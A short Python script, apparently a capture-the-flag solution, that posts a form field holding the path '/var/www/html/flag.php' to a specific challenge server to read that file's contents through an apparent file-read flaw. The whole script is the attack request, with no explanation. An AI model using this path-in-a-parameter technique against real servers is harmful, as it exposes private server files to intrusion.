import requests

url = "http://34.141.41.170:32069/?start=true"
payload = {"start": "/var/www/html/flag.php"}

response = requests.post(url, data=payload)
print(response.text)